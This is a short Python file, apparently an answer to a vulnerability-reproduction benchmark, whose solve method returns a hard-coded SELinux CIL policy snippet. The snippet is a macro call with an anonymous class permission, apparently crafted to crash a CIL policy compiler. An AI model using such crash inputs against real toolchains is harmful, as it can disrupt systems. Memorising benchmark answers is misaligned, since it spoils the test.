import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        return b"(class c (p))\n(macro m ((classpermission x)) (classpermissionset s (x)))\n(call m ((c (p))))\n"